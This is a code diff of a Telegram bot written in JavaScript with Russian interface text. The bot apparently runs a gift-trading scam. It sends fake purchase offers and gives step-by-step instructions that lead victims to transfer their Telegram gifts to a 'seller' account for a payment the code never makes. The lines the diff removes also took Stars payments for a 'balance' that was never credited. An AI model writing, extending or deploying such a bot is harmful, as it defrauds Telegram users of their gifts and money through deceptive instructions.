@@ -23,8 +23,10 @@ export default {
       async function checkAccess(userId, username) {
           if (userId === ADMIN_ID_1 || userId === ADMIN_ID_2) return true; 
           if (!kv) return false; 
+          
           const byId = await kv.get(`allowed_id:${userId}`);
           if (byId) return true;
+          
           if (username) {
               const byName = await kv.get(`allowed_username:${username.toLowerCase()}`);
               if (byName) return true;
@@ -42,53 +44,13 @@ export default {
 
         if (kv) await kv.put(`user:${userId}`, username || "no_username");
 
-        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.\n\n⬇️ <b>Чтобы кидать офферы, пополните баланс командой /buy</b>`;
+        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
         
         const startMarkup = {
           inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
         };
 
         await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
-      }
-
-      // ==========================================
-      // КОМАНДА /buy
-      // ==========================================
-      if (update.message && update.message.text === "/buy") {
-        const chatId = update.message.chat.id;
-        const userId = update.message.from.id;
-
-        const buyText = `💳 <b>Ваш личный кабинет</b>\n\n👤 <b>Профиль:</b> <a href="tg://user?id=${userId}">Ссылка</a>\n🆔 <b>ID:</b> <code>${userId}</code>\n\n💎 <b>Ваш баланс:</b> 0 ⭐ Stars\n📦 <b>Ваши офферы:</b> 0\n\nВыберите действие ниже:`;
-
-        const buyMarkup = {
-          inline_keyboard: [
-            [{ text: "💳 Пополнить баланс", callback_data: "choose_topup" }],
-            [{ text: "📖 Как кидать офферы", callback_data: "how_to_create" }]
-          ]
-        };
-
-        await callApi("sendMessage", { chat_id: chatId, text: buyText, parse_mode: "HTML", reply_markup: buyMarkup }, BOT_TOKEN);
-      }
-
-      // ==========================================
-      // КОМАНДА /BuyGift
-      // ==========================================
-      if (update.message && update.message.text.startsWith("/BuyGift")) {
-        const chatId = update.message.chat.id;
-        const text = update.message.text.trim();
-        const parts = text.split(/\s+/);
-        
-        if (parts.length < 5) {
-             await callApi("sendMessage", { chat_id: chatId, text: "❌ <b>Ошибка формата.</b>\n\nПравильный формат:\n<code>/BuyGift [ссылка] [цена] [валюта] @username</code>", parse_mode: "HTML" }, BOT_TOKEN);
-            return new Response("OK", { status: 200 });
-        }
-
-        const giftLink = parts[1];
-        const price = parts[2];
-        const currency = parts[3];
-        const targetUser = parts[4];
-
-        await callApi("sendMessage", { chat_id: chatId, text: `❌ <b>Ошибка:</b> Не хватает баланса бота.\n\nВы пытались создать оффер:\n🎁 Подарок: ${giftLink}\n💰 Цена: ${price} ${currency}\n👤 Получатель: ${targetUser}\n\nПожалуйста, пополните баланс командой /buy.`, parse_mode: "HTML" }, BOT_TOKEN);
       }
 
       // ==========================================
@@ -106,6 +68,7 @@ export default {
 
         let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
         
+        // ОПРЕДЕЛЕНИЕ ЯЗЫКА (RU, EN, CN)
         let lang = "ru";
         if (textQuery.includes("eng") || textQuery.includes("en ")) { lang = "en"; textQuery = textQuery.replace(/eng/g, '').trim(); } 
         else if (textQuery.includes("cn") || textQuery.includes("中文")) { lang = "cn"; textQuery = textQuery.replace(/cn/g, '').trim(); }
@@ -152,24 +115,12 @@ export default {
             titleText = `Оффер от ${senderName}`;
         }
 
-        // ГЕНЕРИРУЕМ КОРОТКИЙ ID И СОХРАНЯЕМ ДАННЫЕ В KV
-        const offerId = Math.random().toString(36).substring(2, 10);
-        if (kv) {
-            await kv.put(`offer:${offerId}`, JSON.stringify({
-                amount, currencyType, sellerUsername, giftLink, lang, senderName
-            }), { expirationTtl: 86400 }); // Данные живут 24 часа
-        }
-
         const results = [{
           type: "article", id: "1",
           title: titleText,
           description: `За ${amount} ${currencyDisplay}`,
           input_message_content: { message_text: text, parse_mode: "HTML" },
-          reply_markup: { inline_keyboard: [
-              // В кнопку пихаем ТОЛЬКО offerId (максимум 10 символов)
-              [{ text: btnAccept, callback_data: `acc|${offerId}` }],
-              [{ text: btnDecline, callback_data: `dec|${offerId}` }]
-          ] }
+          reply_markup: { inline_keyboard: [[{ text: btnAccept, callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}|${lang}` }],[{ text: btnDecline, callback_data: `dec|${amount}|${currencyType}|${lang}` }]] }
         }];
 
         await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
@@ -181,28 +132,8 @@ export default {
       if (update.callback_query) {
         const cq = update.callback_query;
         const chatId = cq.message.chat.id;
-
-        // Выбор суммы пополнения
-        if (cq.data === "choose_topup") {
-          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
-          const topupText = `💳 <b>Выберите сумму пополнения:</b>`;
-          const topupMarkup = { inline_keyboard: [[{ text: "50 ⭐", callback_data: "pay_50" }],[{ text: "100 ⭐", callback_data: "pay_100" }],[{ text: "500 ⭐", callback_data: "pay_500" }],[{ text: "1000 ⭐", callback_data: "pay_1000" }]] };
-          await callApi("sendMessage", { chat_id: chatId, text: topupText, parse_mode: "HTML", reply_markup: topupMarkup }, BOT_TOKEN);
-        }
-
-        // Инструкция
-        if (cq.data === "how_to_create") {
-          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
-          const instructionCreate = `📖 <b>Как создать оффер:</b>\n\nНапишите в этом боте команду:\n<code>/BuyGift [ссылка] [цена] [валюта] @username</code>\n\n<i>Обратите внимание: для создания оффера нужен положительный баланс бота.</i>`;
-          await callApi("sendMessage", { chat_id: chatId, text: instructionCreate, parse_mode: "HTML" }, BOT_TOKEN);
-        }
-
-        if (cq.data.startsWith("pay_")) {
-          const amount = parseInt(cq.data.split("_")[1]);
-          await callApi("sendInvoice", { chat_id: chatId, title: `Пополнение на ${amount} Stars`, description: `Оплата ${amount} звезд.`, payload: `topup_${amount}`, provider_token: "", currency: "XTR", prices: [{ label: "Пополнение", amount: amount }] }, BOT_TOKEN);
-          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
-        }
-
+        
+        // Инструкция как принять оффер
         if (cq.data === "how_to_accept") {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
           const instructionText = `🎁 <b>Пошаговая инструкция: как принять оффер и получить ⭐️</b>\n\n<b>Шаг 1.</b> Нажмите кнопку «Принять» под сообщением с предложением\n\n<b>Шаг 2.</b> Проверьте сумму и условия сделки\n\n<b>Шаг 3.</b> Нажмите кнопку «🎁 Передать подарок» в сообщении от бота\n\n<b>Шаг 4.</b> Откроется страница подарка — нажмите там кнопку «Передать»\n\n<b>Шаг 5.</b> Выберите продавца из списка и подтвердите передачу\n\n<b>Шаг 6.</b> Дождитесь проверки передачи и оплаты\n\n✅ <b>Проверка передачи:</b>\nСтатус обновляется после фактического подтверждения получения подарка и расчёта.`;
@@ -210,34 +141,26 @@ export default {
           try { await callApi("editMessageText", { chat_id: chatId, message_id: cq.message.message_id, text: instructionText, parse_mode: "HTML", reply_markup: backMarkup }, BOT_TOKEN); } catch (e) {}
         }
 
+        // Возврат к старту
         if (cq.data === "back_to_start") {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
           const userId = cq.from.id;
-          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n⬇️ <b>Чтобы кидать офферы, пополните баланс командой /buy</b>`;
+          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
           const startMarkup = { inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]] };
           try { await callApi("editMessageText", { chat_id: chatId, message_id: cq.message.message_id, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN); } catch (e) {}
         }
 
-        // ОБРАБОТКА КНОПОК ПРИНЯТЬ/ОТКЛОНИТЬ (ВОССТАНОВЛЕНО)
+        // ОБРАБОТКА КНОПОК ПРИНЯТЬ/ОТКЛОНИТЬ В ОФФЕРАХ
         if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
           const dataParts = cq.data.split("|");
           const action = dataParts[0];
-          const offerId = dataParts[1];
+          const amount = dataParts[1] || "0";
+          const currencyType = dataParts[2] || "stars";
+          const sellerUsername = dataParts[3] || "gwrex"; 
+          const giftLink = dataParts[4] || ""; 
           
-          if (!offerId) return new Response("OK", { status: 200 });
-
-          // Достаем данные офера из базы
-          let offer = { amount: "0", currencyType: "stars", sellerUsername: "gwrex", giftLink: "", lang: "ru" };
-          if (kv) {
-              const saved = await kv.get(`offer:${offerId}`);
-              if (saved) offer = JSON.parse(saved);
-          }
-
-          const amount = offer.amount;
-          const currencyType = offer.currencyType;
-          const sellerUsername = offer.sellerUsername;
-          const giftLink = offer.giftLink;
-          const lang = offer.lang;
+          let lang = "ru";
+          if (action === "acc") { lang = dataParts[5] || "ru"; } else { lang = dataParts[3] || "ru"; }
           
           let displayCurrency = "⭐ Stars";
           if (currencyType === "gram") displayCurrency = "💎 Gram";
@@ -292,19 +215,6 @@ export default {
             } catch (err) {}
           }
         }
-      }
-
-      // ==========================================
-      // ОПЛАТА
-      // ==========================================
-      if (update.pre_checkout_query) {
-        await callApi("answerPreCheckoutQuery", { pre_checkout_query_id: update.pre_checkout_query.id, ok: true }, BOT_TOKEN);
-      }
-
-      if (update.message && update.message.successful_payment) {
-        const chatId = update.message.chat.id;
-        const amount = update.message.successful_payment.total_amount;
-        await callApi("sendMessage", { chat_id: chatId, text: `✅ <b>Оплата прошла успешно!</b>\n\nВы пополнили баланс на ${amount} ⭐ Stars.\n\n<i>(Это тестовый режим, баланс не зачислен. Но вы можете продолжать пользоваться ботом!)</i>`, parse_mode: "HTML" }, BOT_TOKEN);
       }
 
       // ==========================================
